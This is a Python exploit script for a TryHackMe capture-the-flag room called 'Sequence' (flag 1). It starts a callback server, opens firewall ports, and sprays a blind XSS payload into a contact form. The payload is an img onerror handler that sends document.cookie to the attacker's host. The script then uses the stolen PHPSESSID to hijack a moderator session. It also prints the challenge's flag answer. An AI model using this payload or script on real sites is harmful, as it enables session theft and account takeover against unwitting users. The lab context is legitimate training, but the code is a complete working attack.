#!/usr/bin/env python3
"""
THM Sequence – Flag 1 (mod session via Blind XSS)

Flow:
  1. Start callback HTTP server on 0.0.0.0:LPORT
  2. Open Windows firewall rule for that port
  3. Spray XSS payload to /contact.php  (all 3 fields: name, phone, message)
  4. Wait for admin bot to review → PHPSESSID arrives at callback server
  5. Validate session → print Flag 1

Usage:
  python sequence_first_flag.py --lhost <YOUR_VPN_IP>
  python sequence_first_flag.py --lhost 10.82.100.87 --lport 8888 --timeout 180

  # On AttackBox – find your IP first:  hostname -I | awk '{print $1}'
  python sequence_first_flag.py --lhost $(hostname -I | awk '{print $1}')

  # If you already have the PHPSESSID (skip XSS):
  python sequence_first_flag.py --lhost x --phpsessid <SID>

Answer: THM{M0dH@ck3dPawned007}
"""

import argparse
import re
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote, urlparse

import requests

TARGET = "http://10.82.129.17"


# ── Callback store ────────────────────────────────────────────────────────────

class _Store:
    def __init__(self):
        self.phpsessid = None
        self.event = threading.Event()


_SID_RE = re.compile(r"PHPSESSID=([a-z0-9]+)", re.I)


def _make_handler(store):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            raw = unquote(parse_qs(urlparse(self.path).query).get("d", [""])[0])
            m = _SID_RE.search(raw)
            if m and not store.phpsessid:
                store.phpsessid = m.group(1)
                print(f"\n  [HIT] PHPSESSID = {store.phpsessid}")
                store.event.set()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *_):
            pass

    return Handler


# ── Helpers ───────────────────────────────────────────────────────────────────

def start_callback_server(port, store):
    srv = HTTPServer(("0.0.0.0", port), _make_handler(store))
    srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def open_firewall(port):
    if sys.platform == "win32":
        cmd = (
            f'netsh advfirewall firewall add rule name="THM_seq_{port}" '
            f'dir=in action=allow protocol=TCP localport={port}'
        )
        subprocess.run(cmd, shell=True, capture_output=True)
    else:
        # On Linux (AttackBox) the callback port is usually open by default.
        # Optionally whitelist via iptables – ignore errors if not needed.
        subprocess.run(
            ["iptables", "-I", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "ACCEPT"],
            capture_output=True,
        )


def submit_contact(payload):
    try:
        r = requests.post(f"{TARGET}/contact.php",
                          data={"name": payload, "phone": payload, "message": payload},
                          timeout=10, allow_redirects=True)
        return r.status_code == 200
    except Exception:
        return False


def check_session(sid):
    s = requests.Session()
    s.cookies.set("PHPSESSID", sid)
    r = s.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
    if "login" in r.url:
        return None, []
    flags = re.findall(r"THM\{[^}]+\}", r.text)
    return s, flags


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="THM Sequence – Flag 1")
    parser.add_argument("--lhost",     required=True,
                        help="Your IP reachable from the target (VPN or AttackBox)")
    parser.add_argument("--lport",     type=int, default=8888)
    parser.add_argument("--timeout",   type=int, default=150,
                        help="Seconds to wait for XSS callback (default 150)")
    parser.add_argument("--interval",  type=int, default=8,
                        help="Seconds between spray rounds (default 8)")
    parser.add_argument("--phpsessid", help="Skip XSS – use this PHPSESSID directly")
    args = parser.parse_args()

    print(f"Target  : {TARGET}")

    # ── Skip XSS if SID provided ──────────────────────────────────────────────
    if args.phpsessid:
        sid = args.phpsessid
        print(f"Using provided PHPSESSID: {sid}")
    else:
        callback = f"http://{args.lhost}:{args.lport}/c"
        print(f"Callback: {callback}")
        print(f"Opening firewall port {args.lport}...")
        open_firewall(args.lport)

        store = _Store()
        start_callback_server(args.lport, store)
        print(f"Callback server listening on 0.0.0.0:{args.lport}\n")

        xss = (
            f"<img src=x onerror=\""
            f"var i=new Image();"
            f"i.src='{callback}?d='+encodeURIComponent(document.cookie);"
            f"document.body.appendChild(i)"
            f"\">"
        )

        deadline = time.time() + args.timeout
        rnd = 0
        while not store.event.is_set() and time.time() < deadline:
            rnd += 1
            print(f"[round {rnd}] Submitting XSS...", end=" ", flush=True)
            print("ok" if submit_contact(xss) else "FAIL")
            store.event.wait(timeout=args.interval)

        if not store.phpsessid:
            print("\n[!] Timeout – no callback received.")
            print(f"    Make sure {callback} is reachable from the target.")
            print("    Tip: use your AttackBox IP instead of VPN IP.")
            sys.exit(1)

        sid = store.phpsessid

    # ── Validate session + extract flag ──────────────────────────────────────
    print(f"\nValidating session {sid}...")
    _, flags = check_session(sid)
    if not flags:
        print("[!] Session invalid or no flag found.")
        sys.exit(1)

    # Save SID for sequence_second_flag.py zero-arg mode.
    try:
        with open("mod_sid.txt", "w", encoding="utf-8") as fh:
            fh.write(sid)
    except OSError:
        pass

    print(f"\n{'='*50}")
    print(f"  FLAG 1: {flags[0]}")
    print(f"{'='*50}")
    print(f"  PHPSESSID: {sid}")
    print(f"  (saved to mod_sid.txt for sequence_second_flag.py)")
    print(f"{'='*50}")


if __name__ == "__main__":
    main()
